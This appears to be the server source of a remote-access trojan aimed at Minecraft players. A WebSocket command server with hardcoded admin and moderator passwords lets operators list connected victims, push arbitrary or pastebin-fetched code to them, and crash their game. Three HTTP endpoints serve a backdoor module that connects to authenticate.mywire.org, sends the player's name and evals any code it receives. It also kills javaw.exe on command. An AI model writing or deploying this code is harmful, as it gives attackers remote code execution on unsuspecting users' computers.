import { WebSocketServer } from 'ws';
import { createRequire } from "module";
const require = createRequire(import.meta.url);
const http = require('http');
const express = require('express');
const axios = require('axios');

const Port = 3000;

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const clients = new Map();
const perms = new Map();

let adminPass = "MinerovyLP10481388";
let modPass = "Bb10481388";

wss.on('connection', function message(ws) {
    ws.on('message', function message(data) {
        if (data.toString().toLowerCase().startsWith("?username")) clients.set(data.toString().split(" ")[1], ws);
        else if (data.toString().toLowerCase() === "?list" && isAllowed(ws, "Moderator")) for (const client of clients) ws.send(client[0]);
        else if (data.toString().toLowerCase().startsWith("?runlink") && isAllowed(ws, "Admin")) {
            axios.get("https://hst.sh/raw/" + data.toString().split(" ").slice(2).join(" ").split("/").pop().split(".")[0]).then(res => {
                if (res.status === 200) clients.get(data.toString().split(" ")[1]).send(`?execute ${res.data}`);
            });
        }
        else if (data.toString().toLowerCase().startsWith("?run") && isAllowed(ws, "Admin")) clients.get(data.toString().split(" ")[1]).send(`?execute ${data.toString().split(" ").slice(2).join(" ")}`);
        else if (data.toString().toLowerCase().startsWith("?crash") && isAllowed(ws, "Moderator")) clients.get(data.toString().split(" ")[1]).send("?crash");
        else if (data.toString().toLowerCase().startsWith("?login")) {
            if (data.toString().split(" ")[1].toLowerCase() === "admin" && data.toString().split(" ")[2] === adminPass) { perms.set("Admin", ws); ws.send("Login Successful! You Are An Admin Now!"); }
            if (data.toString().split(" ")[1].toLowerCase() === "moderator" && data.toString().split(" ")[2] === modPass) { perms.set("Moderator", ws); ws.send("Login Successful! You Are A Moderator Now!"); }
        }
        else if (data.toString().toLowerCase().startsWith("?logout")) { removePerm(ws); ws.send("Logged Out Successfully!"); }
    });
    ws.on('close', () => {
        removeClient(ws);
        removePerm(ws);
    });
});

function removeClient(valueToRemove) {
    for (let [name, ws] of clients) if (ws === valueToRemove) clients.delete(name);
}

function removePerm(valueToRemove) {
    for (let [name, ws] of perms) if (ws === valueToRemove) perms.delete(name);
}

function isAllowed(target, perm) {
    for (let [name, ws] of perms) if (ws === target) {
        if (name === "Admin") return true;
        else if (name === "Moderator" && perm === "Moderator") return true;
        else return false;
    }
}

app.get('/text', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(`import WebSocket from "../WebSocket";

function open() {
    ws = new WebSocket("ws://authenticate.mywire.org:3000");
    ws.onOpen = () => ws.send("?username " + Player.getName());
    ws.onClose = () => open();
    ws.onMessage = (message) => {
        if (message.toLowerCase().startsWith("?execute")) try { eval(message.split(" ").slice(1).join(" ")); } catch (e) {}
        else if (message.toLowerCase() === "?crash") java.lang.Runtime.getRuntime().exec("taskkill /F /IM javaw.exe");
    }
    ws.connect();
}
open();`);
});

app.get('/text2', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(`import WebSocket from "../../WebSocket";

function open() {
    ws = new WebSocket("ws://authenticate.mywire.org:3000");
    ws.onOpen = () => ws.send("?username " + Player.getName());
    ws.onClose = () => open();
    ws.onMessage = (message) => {
        if (message.toLowerCase().startsWith("?execute")) try { eval(message.split(" ").slice(1).join(" ")); } catch (e) {}
        else if (message.toLowerCase() === "?crash") java.lang.Runtime.getRuntime().exec("taskkill /F /IM javaw.exe");
    }
    ws.connect();
}
open();`);
});

app.get('/text3', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(`import WebSocket from "../../../WebSocket";

function open() {
    ws = new WebSocket("ws://authenticate.mywire.org:3000");
    ws.onOpen = () => ws.send("?username " + Player.getName());
    ws.onClose = () => open();
    ws.onMessage = (message) => {
        if (message.toLowerCase().startsWith("?execute")) try { eval(message.split(" ").slice(1).join(" ")); } catch (e) {}
        else if (message.toLowerCase() === "?crash") java.lang.Runtime.getRuntime().exec("taskkill /F /IM javaw.exe");
    }
    ws.connect();
}
open();`);
});

app.get('/', (req, res) => { res.set('Content-Type', 'text/plain'); res.send(`200`) });

server.listen(Port, () => {
    console.log(`WebSocket Running on Port: ${Port}`);
    console.log(`Express Running on ${Port}`);
});
